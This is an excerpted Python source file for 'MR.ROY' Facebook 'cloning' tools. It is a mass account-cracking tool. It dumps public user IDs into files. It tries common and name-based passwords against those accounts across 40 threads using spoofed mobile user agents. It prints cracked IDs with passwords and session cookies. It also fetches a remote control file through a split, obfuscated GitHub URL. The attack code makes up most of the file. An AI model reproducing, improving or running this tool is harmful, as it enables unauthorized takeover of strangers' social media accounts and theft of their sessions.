...
logo=(f"""                        
[b green_yellow]    	d8888b.  .d88b.  db    db 
[b green_yellow]    	88  `8D .8P  Y8. `8b  d8' 
[b green_yellow]    	88oobY' 88    88  `8bd8'  
[b green_yellow]    	88`8b   88    88    88    
[b green_yellow]    	88 `88. `8b  d8'    88    
[b green_yellow]    	88   YD  `Y88P'     YP  
[white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 [white][red]•[white][b green_yellow] FACEBOOK [white][red]•[white][b green_yellow] MR.ROY
 [white][red]•[white][b green_yellow] TOOLS    [white][red]•[white][b green_yellow] PREMIUM
 [white][red]•[white][b green_yellow] VERSION  [white][red]•[b green_yellow][red] 3.5
[white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def live_update():
    try:
        url="https://raw"+".github"+"user"+"cont"+"ent.co"+"m/T"+"EAM-"+"ELIT"+"E1/da"+"tab"+"ase/m"+"ain/"+"X"+"Y-1A"+".txt"
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
...
def main():
    ...
    print(Heron.line())
    print("  [r dark_olive_green1]1[/r dark_olive_green1][b green_yellow] FILE CLONING")
    print("  [r dark_sea_green1]2[/r dark_sea_green1] [b pale_green1]FILE MAKE")
    print(Heron.line())
    print("  [r dark_olive_green1]3[/r dark_olive_green1][b green_yellow] OLD CLONING")
    print("  [r dark_sea_green1]4[/r dark_sea_green1] [b pale_green1]RANDOM")
    print(Heron.line())
    ask=str(input(" \x1b[38;1;198m   \x1b[38;5;155mCHOICE      \x1b[38;5;197m⟨ \x1b[1;97m  "))
    
    if ask in ["01","1","A","a"]:
        print(" [b] [white]  [pale_green1]SELECTED  [red1] ⟩[pale_green1]    FILE CLONING")
        print(Heron.line())
        time.sleep(3)
        filll()
    elif ask in ["02","2","B","b"]:
        print(" [b] [white]  [pale_green1]SELECTED  [red1] ⟩[pale_green1]    FILE MAKE")
        print(Heron.line())
        time.sleep(3)
        
        file_make()
    elif ask in ["03","3","C","c"]:
        print(" [b] [white]  [pale_green1]SELECTED  [red1] ⟩[pale_green1]    OLD CLONING")
        print(Heron.line())
        time.sleep(3)
        old()
    elif ask in ["04","4","d","D"]:
        print(" [b] [white]  [pale_green1]SELECTED  [red1] ⟩[pale_green1]    RANDOM")
        print(Heron.line())
        time.sleep(3)
        ran()
    
    else:
        print(" [b] [white]  [pale_green1]SELECTED  [red1] ⟩[pale_green1]    WRONG OPTION")
        print(Heron.line())
        time.sleep(3)
        main()
...
def filll():
    ...
    pwx=[]
    print(logo)
    print(" [b] [chartreuse1] EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] /sdcard/id.txt")
    flpa=str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(Heron.line())
    try:
    ...
    for i in range(limit):
        print(" [b] [chartreuse1] EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] first123")
        
        flpa=str(input(" \x1b[38;1;198m  \x1b[38;5;155mAdd Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
        
        if flpa not in pwx:
            pwx.append(flpa)
        print(Heron.line())
    print("  [r dark_olive_green1]1[/r dark_olive_green1][b violet] Method A")
    print("  [r dark_olive_green1]2[/r dark_olive_green1][b violet] Method B")
    print("  [r dark_olive_green1]3[/r dark_olive_green1][b violet] Method C")
    print("  [r dark_olive_green1]4[/r dark_olive_green1][b violet] Method D")
    print("  [r dark_olive_green1]5[/r dark_olive_green1][b violet] Method E")
    print("  [r dark_olive_green1]6[/r dark_olive_green1][b violet] Method F")
    print("  [r dark_olive_green1]7[/r dark_olive_green1][b violet] Method G")
    print("  [r dark_olive_green1]8[/r dark_olive_green1][b violet] Method H")
    
    print(Heron.line())
    meth=str(input(" \x1b[38;1;198m   \x1b[38;5;155mCHOICE      \x1b[38;5;197m⟨ \x1b[1;97m  "))
    with ThreadPool(max_workers=40) as sub:
        me.clear()
        print(logo)
        print("[b bright_white]  ! [r violet]USERNAME[/r violet] [light_sky_blue1]   ▶  [/light_sky_blue1] "+ussr[0])
        print(Heron.line())
        print(f"  [r dark_olive_green1]![/r dark_olive_green1][chartreuse1] Today Date  [b deep_pink2]⟨[/b deep_pink2]   {today} ")
        print(f"  [r dark_sea_green1]![/r dark_sea_green1] [light_green]Total Pas[b red1]  ⟩ [/b red1]  [light_green] +{str(len(pwx))}")
        print(Heron.line())
        try:
            for xd in fl:
                uid,name=xd.split("|")
...
def filex(uid,pwx,name,meth,fl):
    ...
    if meth in ["a","A","1"]:
        ...
        uax="Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    sys.stdout.write(f'\r\033[1;37m [{random.choice(color)}ROY-M{meth}\033[1;37m] \033[1;37m[{random.choice(color)}{loop}\033[1;37m]>~<[\033[95m{str(len(fl))}\033[1;37m] \033[1;37m\033[1;32m{str(len(oks))}\033[1;37m|\033[1;30m{str(len(cps))}\033[1;37m|\033[2;37m{str(len(tw))}\033[0;00m\r');sys.stdout.flush()
    ...
    try:
        for pw in pwx:
            ...
            if "session_key" in rq:
                ...
                print(f"\r\r[b r green_yellow][ROY-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}|{coki}\n")
                ...
                print(f"\r\r[b r green_yellow][ROY-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
...
def file_make():
    ...
    print(logo)
    print(" [b] [chartreuse1] EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] /sdcard/save.txt")
    saves=str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    
    print(Heron.line())
    print(" [b] [chartreuse1] EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] 5, 6, 7")
    limi=int(input(" \x1b[38;1;198m  \x1b[38;5;155mPublic Id Limit: "))
    if limi <2:
       limi=3
    print(Heron.line())
    
    for i in range(limi):
        uid=str(input(" \x1b[38;1;198m  \x1b[38;5;155mAdd IDs     \x1b[38;5;196m⟩ \x1b[1;97m   "))
        ...
        try:
            ...
            if len(unlimiteduid) >10:
                print(" [b] [white] [pale_green]Id added")
                print(Heron.line())
            else:
                print(" [b] [white] [pale_green]Id Not public")
                print(Heron.line())
        except Exception as e:
            print(" [b] [white] [pale_green]Error Dump Limit Cross")
            print(Heron.line())
    me.clear()
    print(logo)
    print(f" [b] [white] [pale_green]File Save "+saves)
    print(f" [b] [white] [pale_green]Use Ctrl+Z For Stop Dumping ")
...
def old():
    ...
    print(Heron.line())
    print("  [r dark_olive_green1]A[/r dark_olive_green1][b green_yellow] Crack 2011-14")
    print("  [r dark_sea_green1]B[/r dark_sea_green1] [b pale_green1]Crack 2009-10")
    print(Heron.line())
    ask=str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(Heron.line())
    os.system("clear")
    if ask in["1"]:
        star="10000"
...
def uoa():
    ...
    return f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Mobile Safari/537.36"

def loginxo(uid,user):
    global oks,loop
    
    try:
        sys.stdout.write(f'\r\033[1;37m [{random.choice(color)}ROY\033[1;37m] \033[1;37m[{random.choice(color)}{loop}\033[1;37m]>~<[\033[95m{str(len(user))}\033[1;37m] \033[1;37m\033[1;32m{str(len(oks))}\033[1;37m|\033[1;30m{str(len(cps))}\033[1;37m|\033[2;37m{str(len(tw))}\033[0;00m\r');sys.stdout.flush()
        ...
        for pw in ["123456","1234567","12345678","123456789"]:
            ...
            if "session_key" in rp:
                oks.append(uid)
                print(f"\r\r[reverse white][ROY-OK][/reverse white] [pale_green1]{uid} [white]|[/white][bright_red] {pw}   ")
...
def ran():
    ...
    while True:
        print(" [b] [chartreuse1] [r violet]EXP[/r violet] [chartreuse1]first6 last6 sadiya 57273200")
        ...
        if len(pwx) >=passli:
            ...
            continue
    print("  [r dark_olive_green1]1[/r dark_olive_green1][b violet] Method (M)")
    print("  [r dark_olive_green1]2[/r dark_olive_green1][b violet] Method (X)")
    print("  [r dark_olive_green1]3[/r dark_olive_green1][b violet] Method (P)")
    print("  [r dark_olive_green1]4[/r dark_olive_green1][b violet] Method (Touch)")
    print("  [r dark_olive_green1]5[/r dark_olive_green1][b violet] Method (Free)")
    print("  [r dark_olive_green1]6[/r dark_olive_green1][b violet] Method (Mbasic)")
    print(Heron.line())
    meth=str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    if meth in ["1","a","A"]:
        fb="m"
    elif meth in ["2","b","B"]:
        fb="x"
...
def rensub(uid,pwx,meth,fb,user):
    global oks,loop
    sys.stdout.write(f'\r\033[1;37m [{random.choice(color)}ROY-M{meth.upper()}\033[1;37m] \033[1;37m[{random.choice(color)}{loop}\033[1;37m]>~<[\033[95m{str(len(user))}\033[1;37m] \033[1;37m\033[1;32m{str(len(oks))}\033[1;37m|\033[1;30m{str(len(cps))}\033[1;37m|\033[2;37m{str(len(tw))}\033[0;00m\r');sys.stdout.flush()
...
'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            ...
            if "c_user" in res:
                ...
                xd=xx[:15].replace(";","  ") 
                print(f"\r\r[b r green_yellow][ROY-OK][/b r green_yellow][b chartreuse1]{xd}|{ps}|{coki}\n")
...
def username():
    ...
    try:
        ...
        print(logo)
        name=str(input(" \x1b[38;1;198m   \x1b[38;5;155mYour-Name   \x1b[38;5;197m‣\x1b[1;97m   "))
        print(Heron.line())
    ...
    if "t"+"rue" in jdata["welcome"]:
        ...
        print("  [r dark_olive_green1]![/r dark_olive_green1][chartreuse1] [b]Message[bright_white]: [chartreuse1] Username Not Approved...")
        print(Heron.line())
        reload()
        sys.exit()
